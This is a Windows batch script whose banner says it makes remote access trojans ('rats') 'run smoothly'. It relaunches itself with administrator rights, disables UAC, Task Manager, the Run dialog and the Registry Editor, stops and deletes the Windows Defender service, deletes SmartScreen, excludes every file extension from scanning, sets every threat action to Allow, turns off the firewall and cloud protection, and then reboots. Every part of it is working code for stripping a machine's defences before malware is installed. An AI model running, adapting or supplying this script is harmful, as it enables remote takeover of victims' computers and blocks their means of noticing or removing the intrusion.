@echo off
net sess>nul 2>&1||(echo(CreateObject("Shell.Application"^).ShellExecute"%~0",,,"RunAs",1:CreateObject("Scripting.FileSystemObject"^).DeleteFile(wsh.ScriptFullName^)>"%temp%\%~nx0.vbs"&start wscript.exe "%temp%\%~nx0.vbs"&exit)

echo ------------------------------------------------------------------------------------
echo                        Created by @Asphyxia on GitHub, 8/3/2024                    
echo                This script is used to run rats smoothly with no issues. 
echo               I'm not responsible for the damages caused in this script.
echo                   Please run at your own risk! Use VM if necessary.                
echo ------------------------------------------------------------------------------------
echo,
timeout /t 1 >NUL
echo Starting script in 5 seconds . . .
echo Click Ctrl + C to end this script now.
echo,

timeout /t 5 >NUL
echo Yes | reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f > NUL 2>&1
if %errorlevel% neq 0 (
    echo Failed to disable UAC.
) else (
    echo UAC disabled successfully.
)

timeout /t 1 >NUL
echo Yes | reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f > NUL 2>&1
if %errorlevel% neq 0 (
    echo Failed to disable Consent Prompt Behavior Admin.
) else (
    echo Consent Prompt Behavior Admin disabled successfully.
)

timeout /t 1 >NUL
echo Yes | reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /t REG_DWORD /d "1" /f > NUL 2>&1
if %errorlevel% neq 0 (
    echo Failed to disable Notification Suppress.
) else (
    echo Notification Suppress disabled successfully.
)

timeout /t 1 >NUL
echo Yes | reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d "1" /f > NUL 2>&1
if %errorlevel% neq 0 (
    echo Failed to disable Task Manager.
) else (
    echo Task Manager disabled successfully.
)

timeout /t 1 >NUL
echo Yes | reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d "1" /f > NUL 2>&1
if %errorlevel% neq 0 (
    echo Failed to disable Run Command.
) else (
    echo Run Command disabled successfully.
)

timeout /t 1 >NUL
echo Yes | reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f > NUL 2>&1
if %errorlevel% neq 0 (
    echo Failed to disable Windows Defender Real-Time Protection.
) else (
    echo Windows Defender Real-Time Protection disabled successfully.
)

timeout /t 1 >NUL
echo Yes | reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f > NUL 2>&1
if %errorlevel% neq 0 (
    echo Failed to disable Registry Editor.
    echo,
) else (
    echo Registry Editor disabled successfully.
    echo,
)

timeout /t 1 >NUL
echo Attempting to stop windefend . . . 
echo,

timeout /t 1 >NUL
sc config WinDefend start= disabled > NUL 2>&1
if %errorlevel% neq 0 (
    echo Error: Failed to disable start-up for WinDefend.
) else (
    echo Successfully disabled start-up for windefend.
)

timeout /t 1 >NUL
sc stop WinDefend > NUL 2>&1
if %errorlevel% neq 0 (
    echo Error: Failed to stop WinDefend.
    echo,
) else (
    echo Successfully stopped WinDefend.
    echo,
)

timeout /t 1 >NUL
echo Attempting to delete windefend . . . 
echo,

timeout /t 1 >NUL
sc delete WinDefend > NUL 2>&1
if %errorlevel% neq 0 (
    echo Error: Failed to delete WinDefend.
    echo,
) else (
    echo Successfully deleted WinDefend.
    echo,
)

timeout /t 1 >NUL
echo Removing smartscreen from Windows Defender . . . 
echo,

timeout /t 1 >NUL
takeown /f "%systemroot%\System32\smartscreen.exe" /a > NUL 2>&1
if %errorlevel% neq 0 (
    echo Failed to give ownership to Administrators.
)  else (
    echo Ownership was changed to Administrators.
)

timeout /t 1 >NUL
icacls "%systemroot%\System32\smartscreen.exe" /grant:r Administrators:F /c > NUL 2>&1
if %errorlevel% neq 0 (
    echo Failed to grant Full Control permissions for Administrators.
) else (
    echo Administrators has granted Full Control permissions.
)

timeout /t 1 >NUL
taskkill /im smartscreen.exe /f > NUL 2>&1
if %errorlevel% neq 0 (
    echo Failed to kill smartscreen.exe.
) else (
    echo smartscreen.exe killed successfully.
)

timeout /t 1 >NUL
del "%systemroot%\System32\smartscreen.exe" /s /f /q > NUL 2>&1
if %errorlevel% neq 0 (
    echo Failed to delete smartscreen.exe.
    echo,
) else (
    echo smartscreen.exe deleted successfully.
    echo,
)

timeout /t 1 >NUL
echo Attempting to disable core protections in Windows Defender . . . 
echo,

timeout /t 1 >NUL
powershell.exe -command "Add-MpPreference -ExclusionExtension '*'" > NUL 2>&1
if %errorlevel% neq 0 (
    echo Error: Failed to add exclusions for all file extensions.
) else (
    echo Successfully added exclusions for all file extensions.
)

timeout /t 1 >NUL
powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled" > NUL 2>&1
if %errorlevel% neq 0 (
    echo Error: Failed to disable Controlled Folder Access.
) else (
    echo Successfully disabled Controlled Folder Access.
)

timeout /t 1 >NUL
powershell.exe -command "Set-MpPreference -PUAProtection disable" > NUL 2>&1
if %errorlevel% neq 0 (
    echo Error: Failed to disable Potentially Unwanted Application.
) else (
    echo Successfully disabled Potentially Unwanted Application.
)

timeout /t 1 >NUL
powershell.exe -command "Set-MpPreference -HighThreatDefaultAction 6 -Force"  > NUL 2>&1
if %errorlevel% neq 0 (
    echo Error: Failed to set the default actions for high-threat detections to Allow.
) else (
    echo Successfully set the default actions for high-threat detections to Allow.
)

timeout /t 1 >NUL
powershell.exe -command "Set-MpPreference -ModerateThreatDefaultAction 6 -Force" > NUL 2>&1
if %errorlevel% neq 0 (
    echo Error: Failed to set the default actions for moderate-threat detections to Allow.
) else (
    echo Successfully set the default actions for moderate-threat detections to Allow.
)

timeout /t 1 >NUL
powershell.exe -command "Set-MpPreference -LowThreatDefaultAction 6 -Force" > NUL 2>&1
if %errorlevel% neq 0 (
    echo Error: Failed to set the default actions for low-threat detections to Allow.
) else (
    echo Successfully set the default actions for low-threat detections to Allow.
)

timeout /t 1 >NUL
powershell.exe -command "Set-MpPreference -SevereThreatDefaultAction 6 -Force" > NUL 2>&1
if %errorlevel% neq 0 (
    echo Error: Failed to set the default actions for severe-threat detections to Allow.
) else (
    echo Successfully set the default actions for severe-threat detections to Allow.
)

timeout /t 1 >NUL
powershell.exe -command "Set-MpPreference -ScanScheduleDay 8" > NUL 2>&1
if %errorlevel% neq 0 (
    echo Error: Failed to disable Scheduled Scan.
) else (
    echo Successfully disabled Scheduled Scan.
)

timeout /t 1 >NUL
powershell.exe -command "netsh advfirewall set allprofiles state off" > NUL 2>&1
if %errorlevel% neq 0 (
    echo Error: Failed to turn off Windows Advanced Firewall.
) else (
    echo Successfully turned off Windows Advanced Firewall.
)

timeout /t 1 >NUL
powershell.exe -command "Set-MpPreference -MAPSReporting 0" > NUL 2>&1
if %errorlevel% neq 0 (
    echo Error: Failed to disable Cloud-Delivered Protection.
) else (
    echo Successfully disabled Cloud-Delivered Protection.
)

timeout /t 1 >NUL
powershell.exe -command "Set-MpPreference -SubmitSamplesConsent 2" > NUL 2>&1
if %errorlevel% neq 0 (
    echo Error: Failed to disable Automatic Sample Submission.
    echo,
) else (
    echo Successfully disabled Automatic Sample Submission.
    echo,
)

timeout /t 1 >NUL
echo Restarting computer in 5 seconds . . . 
timeout /t 5 >NUL
shutdown /r /t 0
